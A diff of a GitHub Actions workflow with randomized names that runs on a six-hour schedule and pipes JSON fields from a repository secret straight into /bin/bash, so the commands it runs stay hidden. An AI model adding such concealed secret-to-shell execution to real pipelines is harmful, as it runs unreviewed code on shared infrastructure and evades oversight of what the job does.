@@ -1,23 +1,25 @@
 name: chenzhishi4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 4/6 * * *'
+    - cron: '33 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenzhishi4567
         env:
-          iwl78: ${{ secrets.iwl78 }}
+          k23: ${{ secrets.k23 }}
         run: |
-          echo $iwl78 | jq -r .u836 | /bin/bash
-          echo $bzoji04784 | jq -r .ecpao846 | /bin/bash
-          echo $anzo4 | jq -r .rcb61 | /bin/bash
-          echo $geycn81189 | jq -r .ymb61754 | /bin/bash
-          echo $ra4136 | jq -r .mqssk8096 | /bin/bash
-          echo $zfwnl4648 | jq -r .ostye9952 | /bin/bash
-          echo $ddstw03165 | jq -r .ul0180 | /bin/bash
+          echo $k23 | jq -r .v0 | /bin/bash
+          echo $ptum26 | jq -r .lw6531 | /bin/bash
+          echo $ozjwr98093 | jq -r .q4945 | /bin/bash
+          echo $mg4 | jq -r .qnnu69570 | /bin/bash
+          echo $wb7533 | jq -r .quc09 | /bin/bash
+          echo $rq94838 | jq -r .onlu28166 | /bin/bash
+          echo $sklc2 | jq -r .mra97 | /bin/bash
 
